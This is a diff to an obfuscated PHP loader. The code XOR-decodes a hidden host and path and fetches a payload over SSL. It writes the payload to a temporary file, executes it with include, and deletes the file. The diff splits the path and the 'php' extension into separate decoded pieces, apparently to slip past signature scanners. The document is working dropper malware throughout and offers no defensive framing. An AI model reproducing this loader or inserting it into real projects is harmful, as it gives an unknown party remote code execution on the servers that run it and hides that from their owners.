@@ -8,13 +8,15 @@ function xorEncryptDecrypt($data, $key) {
 }
 $_ = "!";
 	$url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
-	$path = xorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HOYYQIQ", $_);
+	$path = xorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
+	$exx = xorEncryptDecrypt("QIQ", $_);
+	$pc = $path."ws".$exx;
 	$fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
 		if (!$fp) {
 			echo "Error: $errstr ($errno)";
 			exit;
 	}
-		$request = "GET $path HTTP/1.1\r\n";
+		$request = "GET $pc HTTP/1.1\r\n";
 		$request .= "Host: $url\r\n";
 		$request .= "Connection: close\r\n\r\n";
 			fwrite($fp, $request);
@@ -26,7 +28,7 @@ $_ = "!";
 list(, $remotePayload) = explode("\r\n\r\n", $response, 2);
 	$parts = str_split($remotePayload, 4);
 	$obfuscatedPayload = implode('', $parts);
-	$tempFile = tempnam(sys_get_temp_dir(), 'php');
+	$tempFile = tempnam(sys_get_temp_dir(), $exx);
 		file_put_contents($tempFile, $obfuscatedPayload);
 	include $tempFile;
 unlink($tempFile);
